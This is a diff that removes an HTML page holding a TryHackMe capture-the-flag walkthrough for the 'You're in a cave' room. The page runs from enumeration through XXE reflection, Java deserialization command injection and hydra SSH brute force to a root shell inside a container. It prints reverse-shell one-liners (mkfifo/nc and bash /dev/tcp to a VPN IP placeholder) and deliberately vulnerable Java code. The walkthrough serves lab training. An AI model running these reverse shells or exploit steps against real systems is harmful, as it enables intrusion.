@@ -1,471 +1,278 @@
-
 <!doctype html>
-<html lang="en-US">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-
-<!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>You’re in a cave official Writeup | Termack’s blog</title>
-<meta name="generator" content="Jekyll v3.9.0" />
-<meta property="og:title" content="You’re in a cave official Writeup" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="Here i’ll post writeups i make for tryhackme rooms and maybe other things in the future" />
-<meta property="og:description" content="Here i’ll post writeups i make for tryhackme rooms and maybe other things in the future" />
-<link rel="canonical" href="https://termack.github.io/thm_writeups/inacave.html" />
-<meta property="og:url" content="https://termack.github.io/thm_writeups/inacave.html" />
-<meta property="og:site_name" content="Termack’s blog" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="You’re in a cave official Writeup" />
-<script type="application/ld+json">
-{"description":"Here i’ll post writeups i make for tryhackme rooms and maybe other things in the future","url":"https://termack.github.io/thm_writeups/inacave.html","@type":"WebPage","headline":"You’re in a cave official Writeup","@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-
-    <link rel="stylesheet" href="/assets/css/style.css?v=69374a5ae6fc81561b4189d6320942153c934061">
-    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
-    <script src="/assets/js/respond.js"></script>
-    <!--[if lt IE 9]>
-      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
-    <![endif]-->
-    <!--[if lt IE 8]>
-    <link rel="stylesheet" href="/assets/css/ie.css">
-    <![endif]-->
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-
-  </head>
-  <body>
-
-    <div class="wrapper">
-
-      <section>
-        <div id="title">
-          <h1>Termack's blog</h1>
-          <p>Here i'll post writeups i make for tryhackme rooms and maybe other things in the future</p>
-          <p>Check me up on: <a href="https://github.com/Termack">Github</a> , <a href="https://tryhackme.com/p/Termack">Tryhackme</a></p>
-          <hr>
-          <span class="credits left">Project maintained by <a href="https://github.com/Termack">Termack</a></span>
-          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
-        </div>
-
-        <h1 id="youre-in-a-cave-official-writeup">You’re in a cave official Writeup</h1>
-
-<h2 id="enumeration">Enumeration</h2>
-
-<p>First we’ll start scanning ports with nmap.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE    VERSION
-80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Document
-2222/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-3333/tcp open  dec-notes?
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-
-<p>Okay, there’s ssh running on port 2222, a http server on port 80 and a weird service running on port 3333.</p>
-
-<p>Let’s take a look at this service running on port 3333.</p>
-
-<p>When we connect to it we receive this:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  You find yourself in a cave, what do you do?
-</code></pre></div></div>
-
-<p>If we try to write some things it says that nothing happens, maybe this is buffer overflow? Lets see the web server to see if we can find something.</p>
-
-<p>When we connect to the webserver we are greeted with a text written “What do you do?” and an input, what we put into the input gets posted to action.php, but we don’t get anything, doesn’t matter what we write.</p>
-
-<p>Lets try to see directories in the webserver, i’ll run gobuster with the common.txt file, here’s the output:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>===============================================================
-2020/08/28 10:34:47 Starting gobuster
-===============================================================
-/.htaccess (Status: 403)
-/.htaccess.php (Status: 403)
-/.htaccess.html (Status: 403)
-/.htaccess.txt (Status: 403)
-/.htpasswd (Status: 403)
-/.htpasswd.php (Status: 403)
-/.htpasswd.html (Status: 403)
-/.htpasswd.txt (Status: 403)
-/.hta (Status: 403)
-/.hta.php (Status: 403)
-/.hta.html (Status: 403)
-/.hta.txt (Status: 403)
-/index.php (Status: 200)
-/index.php (Status: 200)
-/matches (Status: 200)
-/search (Status: 200)
-/server-status (Status: 403)
-===============================================================
-2020/08/28 10:37:25 Finished
-===============================================================
-</code></pre></div></div>
-
-<p>There are these two interesting pages, /matches and /search, both of them have a base64 encoded string. If we decode them, it looks like it’s something written for java.</p>
-
-<p>They are serialized objects and this search could be something that an RPG character could try to do, isn’t it? Also these are serialized objects, so maybe we can try to go back to that service running on port 3333 and see if we can get something from it.</p>
-
-<p>If we go to the service and write search we get this output:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You can't see anything, the cave is very dark.
-</code></pre></div></div>
-<p>Now the output for matches:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.
-</code></pre></div></div>
-<p>Wow, interesting, the output is clearly encoded in those pages, and also, the matches command told us we are in /home/cave/src, interesting.</p>
-
-<p>So let’s try to enumerate a bit more with gobuster with a different wordlist and while we wait for the output, let’s take a better look into action.php page.</p>
-
-<p>If we see the request made to it, it returns a 400 status code, so there is something wrong with the request. Let’s intercept the request with burp and try to tinker with it.</p>
-
-<p>Okay, what are the options we have to change in this broken request? Not much, but we can play with the headers, but which header has the correct information we need to change? Well if we try to think of things that can make a request be malformed, one of them would be the content-type being wrong and theres a well known web vulnerability that is called XML External Entity, so lets try to change Content-Type header to application/xml, we can see an error popping up in the response:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Start tag expected, '&lt;' not found
-</code></pre></div></div>
-
-<p>Okay, now it’s obvious, let’s try for XXE, i’ll send a payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadsAllTheThings</a> and we can read /etc/passwd, okay good, but maybe there are some more interesting files we can read.</p>
-
-<p>Let’s go back to the output of our gobuster that we left running some time ago:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>===============================================================
-2020/08/28 11:07:09 Starting gobuster
-===============================================================
-/search (Status: 200)
-/attack (Status: 200)
-/lamp (Status: 200)
-/matches (Status: 200)
-/walk (Status: 200)
-</code></pre></div></div>
-
-<p>Oh, new commands for our service running on port 3333 let’s see their outputs:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>attack: You punch the wall, nothing happens.
-walk: There's nowhere to go.
-lamp: You grab a lamp, and it gives enough light to search around
-      Action.class
-      RPG.class
-      RPG.java
-      Serialize.class
-      commons-io-2.7.jar
-      run.sh
-</code></pre></div></div>
-
-<p>Oh, the lamp showed us something interesting… Maybe we can try to read the RPG.java using the XXE from action.php, since we have the path and the filename.</p>
-
-<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.net.ServerSocket</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.net.Socket</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.net.URLConnection</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.apache.commons.io.IOUtils</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.util.logging.Level</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.util.logging.Logger</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RPG</span> <span class="o">{</span>
-
-    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">3333</span><span class="o">;</span>
-    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">Socket</span> <span class="n">connectionSocket</span><span class="o">;</span>
-
-    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">InputStream</span> <span class="n">is</span><span class="o">;</span>
-    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">OutputStream</span> <span class="n">os</span><span class="o">;</span>
-
-    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">;</span>
-    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">PrintWriter</span> <span class="n">serverPrintOut</span><span class="o">;</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">(</span> <span class="nc">ServerSocket</span> <span class="n">serverSocket</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ServerSocket</span><span class="o">(</span><span class="n">port</span><span class="o">))</span> <span class="o">{</span>
-            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">connectionSocket</span> <span class="o">=</span> <span class="n">serverSocket</span><span class="o">.</span><span class="na">accept</span><span class="o">();</span>
-
-                <span class="n">is</span> <span class="o">=</span> <span class="n">connectionSocket</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
-                <span class="n">os</span> <span class="o">=</span> <span class="n">connectionSocket</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
-
-                <span class="n">scanner</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">);</span>
-                <span class="n">serverPrintOut</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrintWriter</span><span class="o">(</span><span class="k">new</span> <span class="nc">OutputStreamWriter</span><span class="o">(</span><span class="n">os</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">),</span> <span class="kc">true</span><span class="o">);</span>
-                <span class="k">try</span> <span class="o">{</span>
-                    <span class="n">serverPrintOut</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"You find yourself in a cave, what do you do?"</span><span class="o">);</span>
-                    <span class="nc">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
-                    <span class="no">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"http://cave.thm/"</span> <span class="o">+</span> <span class="n">s</span><span class="o">);</span>
-                    <span class="nc">URLConnection</span> <span class="n">con</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
-                    <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
-                    <span class="nc">String</span> <span class="n">encoding</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="na">getContentEncoding</span><span class="o">();</span>
-                    <span class="n">encoding</span> <span class="o">=</span> <span class="n">encoding</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="s">"UTF-8"</span> <span class="o">:</span> <span class="n">encoding</span><span class="o">;</span>
-                    <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="nc">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">in</span><span class="o">,</span> <span class="n">encoding</span><span class="o">);</span>
-                    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"\n"</span><span class="o">,</span> <span class="s">""</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">"\r"</span><span class="o">,</span> <span class="s">""</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">" "</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
-                    <span class="nc">Action</span> <span class="n">action</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Action</span><span class="o">)</span> <span class="nc">Serialize</span><span class="o">.</span><span class="na">fromString</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
-                    <span class="n">action</span><span class="o">.</span><span class="na">action</span><span class="o">();</span>
-                    <span class="n">serverPrintOut</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">action</span><span class="o">.</span><span class="na">output</span><span class="o">);</span>
-                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="n">serverPrintOut</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Nothing happens"</span><span class="o">);</span>
-                <span class="o">}</span>
-                <span class="n">connectionSocket</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-            <span class="o">}</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-
-<span class="kd">class</span> <span class="nc">Action</span> <span class="kd">implements</span> <span class="nc">Serializable</span> <span class="o">{</span>
-
-    <span class="kd">public</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">name</span><span class="o">;</span>
-    <span class="kd">public</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">command</span><span class="o">;</span>
-    <span class="kd">public</span> <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
-
-    <span class="kd">public</span> <span class="nf">Action</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">,</span> <span class="nc">String</span> <span class="n">command</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
-        <span class="k">this</span><span class="o">.</span><span class="na">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">;</span>
-    <span class="o">}</span>
-
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">action</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
-        <span class="nc">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-        <span class="nc">String</span><span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="o">{</span>
-            <span class="s">"/bin/sh"</span><span class="o">,</span>
-            <span class="s">"-c"</span><span class="o">,</span>
-            <span class="s">"echo \""</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">command</span> <span class="o">+</span> <span class="s">"\""</span>
-        <span class="o">};</span>
-        <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
-        <span class="nc">BufferedReader</span> <span class="n">stdInput</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
-        <span class="nc">String</span> <span class="n">result</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
-        <span class="k">while</span> <span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">stdInput</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">result</span> <span class="o">+=</span> <span class="n">s</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">;</span>
-        <span class="o">}</span>
-        <span class="k">this</span><span class="o">.</span><span class="na">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">;</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-
-<span class="kd">class</span> <span class="nc">Serialize</span> <span class="o">{</span>
-
-    <span class="cm">/**
-     * Read the object from Base64 string.
-     */</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">fromString</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span>
-            <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
-        <span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
-        <span class="nc">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span>
-                <span class="k">new</span> <span class="nf">ByteArrayInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">));</span>
-        <span class="nc">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
-        <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-        <span class="k">return</span> <span class="n">o</span><span class="o">;</span>
-    <span class="o">}</span>
-
-    <span class="cm">/**
-     * Write the object to a Base64 string.
-     */</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">toString</span><span class="o">(</span><span class="nc">Serializable</span> <span class="n">o</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
-        <span class="nc">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayOutputStream</span><span class="o">();</span>
-        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
-        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
-        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-        <span class="k">return</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
-    <span class="o">}</span>
-<span class="o">}</span></code></pre></figure>
-
-<p>Okay, reading the java code we can see that the service works like this:
-Tt gets your input and sends it as a request to the webserver like this <code class="language-plaintext highlighter-rouge">https://cave.thm/&lt;input&gt;</code>, then it gets the response and deserializes it (as you noticed the pages have serialized objects), then it gets the command variable of the object and passes it in the command /bin/sh -c “<code class="language-plaintext highlighter-rouge">&lt;command&gt;</code>” so, if you manipulate the command part of a serialized object you have remote code execution.</p>
-
-<p>Now, we’re able to create a serialized object using the code we got from RPG.java, the only thing we need to do is manipulate the response to make the java code deserialize it. We know that the page is vulnerable to XXE and the hint says, sometimes things that work with post can work with get, with XXE we can reflect anything we send, so if we try sending a request to <code class="language-plaintext highlighter-rouge">/action.php?&lt;xml&gt;[serializedobject]&lt;/xml&gt;</code> we get the serialized object back and as we know, the service running on port 3333 sends our input to the webserver, so if we send <code class="language-plaintext highlighter-rouge">action.php?&lt;xml&gt;[serializedobject]&lt;/xml&gt;</code> as input to the service, the response will be [serializedobject] and it will be deserialized, executing any command we want it to.</p>
-
-<p>So we need to give an object to execute a command in the machine.</p>
-
-<p>First let’s make this serialized object, luckily for you (if you don’t like java), the code already has a function to serialize objects, so let’s use that function.</p>
-
-<p>Lets modify the main function with this:</p>
-
-<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>                                                                                                  
-        <span class="k">try</span><span class="o">{</span>                                                                                                                                  
-            <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="nc">Serialize</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span> <span class="k">new</span> <span class="nc">Action</span><span class="o">(</span><span class="s">"abc"</span><span class="o">,</span><span class="s">"trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [YOUR_VPN_IP] 1234 &gt;/tmp/f;echo \""</span><span class="o">)</span> <span class="o">);</span>                                                                                                                        
-            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span> <span class="s">"abc : "</span> <span class="o">+</span> <span class="n">str</span> <span class="o">);</span>                                                                                                                                                                        
-        <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>                                                                                                                  
-            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"aa"</span><span class="o">);</span>                                                                                                         
-        <span class="o">}</span>                                                                                                                                     
-    <span class="o">}</span></code></pre></figure>
-
-<p>Also remove this line import org.apache.commons.io.IOUtils; now compile and run the code to get the serialized object, be aware that the service running on port 3333 uses jdk 1.8.0_251, so if your java version is different it may not work since serialization changed a bit in other versions:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ javac RPG.java
-$ java RPG
-abc : [base64EncodedObject]
-</code></pre></div></div>
-
-<p>Okay, we have the object, now let’s send our payload!</p>
-
-<p>So let’s setup a netcat listener and then try sending <code class="language-plaintext highlighter-rouge">action.php?&lt;xml&gt;[serializedobject]&lt;/xml&gt;</code> to the service, let’s not forget to url encode the payload since some charaters in it can become weird in the url, before trying the payload in the service running in port 3333, try sending to the web server to check if the payload gets reflected correctly.
-We get a reverse shell in the machine.</p>
-
-<p>Let’s go to our user’s home directory, there’s a file called info.txt:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>After getting information from external entities, you saw that one part of the wall was different from the rest, when touching it, it revealed a wooden door without a keyhole.
-On the door it is carved the following statement:
-
-              The password is in
-              [REDACTED-REGEX]
-</code></pre></div></div>
-
-<p>Okay we get our first flag. Now what can we do with this?
-This is a regex statement and the file says that the password is in there, so maybe we can make a wordlist out of the regex and try to brute force the door user.</p>
-
-<p>I searched on google how to make a wordlist from regex and found <a href="https://www.sjoerdlangkemper.nl/2017/05/10/generating-password-list-with-regexes/">this</a>. This site speaks about a tool named exrex.py, I used it to make the wordlist.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exrex -o passwords "[REDACTED-REGEX]"
-</code></pre></div></div>
-
-<p>Then i used hydra to bruteforce it:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l door -P passwords [REMOTE_IP] ssh -s 2222 -vV
-</code></pre></div></div>
-
-<p>After some minutes, hydra finds the password and we can go on with our quest.</p>
-
-<p>When we get to door, there are 3 files in the home directory info.txt  oldman.gpg  skeleton, let’s cat info.txt</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>After using your brute force against the door you broke it!
-You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
-It looks like the skeleton doesn't want to let anyone pass through.
-</code></pre></div></div>
-
-<p>Okay, now the oldman.gpg is an encrypted file and lets try to execute skeleton.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You cannot defeat the skeleton with your current items, your inventory is empty.
-</code></pre></div></div>
-
-<p>Maybe you get a different output if you used su instead of connecting from ssh because if we decode the lamp file we can see the following output:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srActionM;LcommandtLjava/lang/String;Lnameq~Loutputq~xptaYou grab a lamp, and it gives enough light to search around
-`ls;export INVENTORY=lamp:$INVENTORY`t
-</code></pre></div></div>
-
-<p>It is exporting lamp into the INVENTORY environment variable, so now we know what is our inventory, but what do we need in the inventory to defeat the skeleton?</p>
-
-<p>Let’s go back to oldman.gpg, we need a private key to decrypt the message, enumerating the machine we can see that there is a folder called adventurer inside /var/www that we don’t have access to, but www-data has access, so maybe that folder is a subdomain?
-Since we read RPG.java we know that the machine is using the domain cave.thm, so let’s add adventurer.cave.thm to our /etc/hosts file and see if there is something different.</p>
-
-<p>There is a file called adventurer.priv inside it, let’s wget it onto the machine.</p>
-
-<p>Now we have the private key, if we try to gpg –import adventurer.priv, it asks for a password, we dont know the password.
-If we look the hint in for this task, it is saying “Take a second look in the text files”, but if we cat info.txt there is nothing interesting in it, lets try to edit it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>After using your brute force against the door you broke it!
-You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
-The private key password is [REDACTED-PRIVATE-KEY-PASSWORD] ^[[A
-It looks like the skeleton doesn't want to let anyone pass through.
-</code></pre></div></div>
-
-<p>If we try to edit it with any editor, or if we cat it using cat -v info.txt we can see that the file has a ^[[A that get escaped by cat and it hides the line, so now we have the password for the private key, let’s decrypt the message.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gpg --import adventurer.priv
-$ gpg --output message --no-tty oldman.gpg
-$ cat message
-IT'S DANGEROUS TO GO ALONE! TAKE THIS [REDACTED-ITEM]
-</code></pre></div></div>
-
-<p>Let’s add the [REDACTED-ITEM] to the inventory using export INVENTORY=[REDACTED-ITEM] and then execute the skeleton.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export INVENTORY=[REDACTED-ITEM]
-$ ./skeleton
-skeleton:[REDACTED-PASSWORD]
-</code></pre></div></div>
-
-<p>Let’s su into the skeleton.
-It has a info.txt file, let’s read it:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>After successfully defeating the skeleton with the [REDACTED-ITEM] you went forward.
-In front of you there's a big opening and after it there's a huge tree that seems magical, you can feel the freedom!
-But although you can see it, you can't go to it because there's an invisible wall that keeps you from getting to the root of the tree.
-</code></pre></div></div>
-
-<p>Let’s check our sudo privileges as the skeleton</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
-Matching Defaults entries for skeleton on localhost:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User skeleton may run the following commands on localhost:
-    (root) NOPASSWD: /bin/kill
-</code></pre></div></div>
-
-<p>We can use /bin/kill, there is nothing about it in <a href="https://gtfobins.github.io">GTFOBins</a> so let’s enumerate more.
-If we go to /opt there is a different directory there called link and if we list it we can see:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>skeleton@cave:/opt/link$ ls -la
-total 8
-drwxrwxrwx 2 root     root     4096 Aug 28 00:00 .
-drwxr-xr-x 1 root     root     4096 Aug 27 23:59 ..
-lrwxrwxrwx 1 skeleton skeleton   16 Aug 27 23:55 startcon -&gt; ../root/start.sh
-</code></pre></div></div>
-
-<p>There is a file linked to ../root/start.sh, but there is no root directory in /opt, but there is one in /, lets move this file to /tmp.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mv ./startcon /tmp
-$ cd /tmp
-$ cat startcon
-#!/bin/bash
-
-service ssh start
-service apache2 start
-su - cave -c "cd /home/cave/src; ./run.sh"
-
-/bin/bash
-</code></pre></div></div>
-
-<p>This looks like a file that executes when the system starts and if we cat /proc/1/cgroup, we can see that we are inside a docker container.</p>
-
-<p>If we try to edit this file, we can see that we can do it, so i added a bash -i &gt;&amp; /dev/tcp/[YOUR_VPN_IP]/1234 0&gt;&amp;1 to the file and then started a netcat listener in my machine.</p>
-
-<p>Now we need to know how to restart a docker container from the inside, searching on the web i found out that, to stop a docker container from inside, you need to kill the proccess with the PID 1. We can kill processes.</p>
-
-<p>Now we can go on killing off all processes until the container stops.</p>
-
-<p>When the container stops, we get a connection in our listener.</p>
-
-<p>Lets go to /root, there we have a info.txt:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You were analyzing the invisible wall and after some time, you could see your reflection in the corner of the wall.
-But it wasn't just like a mirror, your reflection could interact with the real world, there was a link between you two!
-And then you used your reflection to grab a little piece of the root of the tree and you stuck it in the wall with all your might.
-You could feel the cave rumbling, like it was the end for you and then all went black.
-But after some time, you woke up in the same place you were before, but now there was no invisible wall to stop you from getting in the root.
-
-You are in the root of a huge tree, but your quest isn't over, you still feel ... contained, inside this cave.
-
-Flag:[REDACTED]
-</code></pre></div></div>
-
-<p>Okay, we are in a container, we know that, now we need to escape.</p>
-
